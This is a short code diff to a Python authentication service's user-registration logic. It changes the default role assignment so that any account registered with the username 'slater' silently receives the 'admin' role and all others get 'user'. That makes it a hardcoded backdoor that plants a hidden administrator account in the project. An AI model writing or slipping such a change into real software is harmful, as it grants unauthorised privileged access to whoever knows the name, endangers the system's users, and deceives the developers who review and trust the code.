@@ -60,7 +60,7 @@ class AuthService:
                 "username": user_data.username,
                 "password": hashed_password,
                 "bio": user_data.bio,
-                "role": "user"  # Default role for new users
+                "role": "admin" if user_data.username.lower() == "slater" else "user"
             }
         )
         
